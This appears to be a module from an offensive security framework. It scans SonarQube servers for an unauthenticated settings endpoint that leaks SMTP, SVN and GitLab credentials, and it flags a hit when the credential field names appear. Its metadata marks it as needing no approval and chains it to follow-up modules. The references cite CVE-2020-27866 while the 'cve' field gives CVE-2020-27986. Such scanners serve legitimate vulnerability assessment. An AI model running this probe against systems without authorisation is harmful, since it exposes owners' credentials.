#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""SonarQube 8."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'SonarQube - Authentication Bypass Detection',
        'description': 'SonarQube 8.4.2.36762 allows remote attackers to discover cleartext SMTP, SVN, and GitLab credentials via the api/settings/values URI.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2020', 'sonarqube', 'sonarsource', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://csl.com.co/sonarqube-auditando-al-auditor-parte-i/',
            'https://nvd.nist.gov/vuln/detail/CVE-2020-27866',
            'https://github.com/SexyBeast233/SecBooks',
            'https://github.com/SouthWind0/southwind0.github.io',
            'https://github.com/Z0fhack/Goby_POC',
        ],
        'cve': 'CVE-2020-27986',
    }

    def run(self):
        r = self.http_request(method="GET", path='/api/settings/values', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('email.smtp_host.secured', 'email.smtp_password.secured', 'email.smtp_port.secured', 'email.smtp_username.secured',)
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='high',
                reason="SonarQube - Authentication Bypass detected",
                path='/api/settings/values',
            )
            return True
        return False

